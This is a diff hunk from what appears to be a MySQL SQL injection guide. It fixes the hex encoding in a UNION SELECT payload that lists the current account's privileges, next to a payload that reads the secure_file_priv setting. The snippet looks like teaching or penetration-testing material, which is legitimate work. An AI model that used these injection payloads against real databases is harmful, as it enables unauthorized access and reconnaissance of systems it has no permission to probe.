@@ -24,7 +24,7 @@ Version and identity come from system functions and variables, read through what
 Privileges decide how far the injection goes. The account's grants are in `information_schema.user_privileges`, and the file-access setting is in `secure_file_priv`:
 
 ```sql
-' UNION SELECT GROUP_CONCAT(privilege_type),NULL,NULL FROM information_schema.user_privileges WHERE grantee=CONCAT(0x27,REPLACE(current_user(),0x40,0x27405c27),0x27)-- 
+' UNION SELECT GROUP_CONCAT(privilege_type),NULL,NULL FROM information_schema.user_privileges WHERE grantee=CONCAT(0x27,REPLACE(current_user(),0x40,0x274027),0x27)-- 
 ' UNION SELECT @@secure_file_priv,NULL,NULL-- 
 ```
 
